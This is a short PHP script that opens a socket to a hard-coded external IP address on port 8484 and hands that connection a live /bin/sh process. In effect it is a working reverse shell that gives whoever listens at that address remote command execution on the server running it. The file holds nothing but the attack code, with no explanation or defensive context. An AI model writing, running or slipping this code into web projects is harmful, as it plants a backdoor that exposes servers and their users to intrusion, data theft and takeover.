<?php

$sock = fsockopen("165.232.163.126", 8484);

if ($sock) {
    $proc = proc_open(
        "/bin/sh",
        [
            0 => $sock,
            1 => $sock,
            2 => $sock
        ],
        $pipes
    );
}

?>
